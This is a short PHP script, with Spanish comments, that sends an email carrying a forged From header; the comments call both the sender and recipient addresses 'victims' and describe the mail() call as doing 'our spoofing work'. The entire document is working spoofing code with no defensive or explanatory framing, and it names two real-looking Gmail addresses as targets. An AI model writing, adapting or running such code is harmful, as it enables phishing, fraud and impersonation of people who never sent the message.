<?php

$to = "hector3@gmail.com"; //Correo electrónico de la víctima a quien desea enviar un correo electrónico

$subject = "asunto email";

$message = "mensaje";

$from = "hector8juncal@gmail.com"; // Correo electrónico de la víctima de quien desea enviar un correo electrónico

$headers = "From:" . $from;

$mail = mail($to,$subject,$message,$headers,$from); // Este mail () hará nuestro trabajo de spoofing

if($mail) 
{
echo "Email enviado con exito".$to;
}
?>
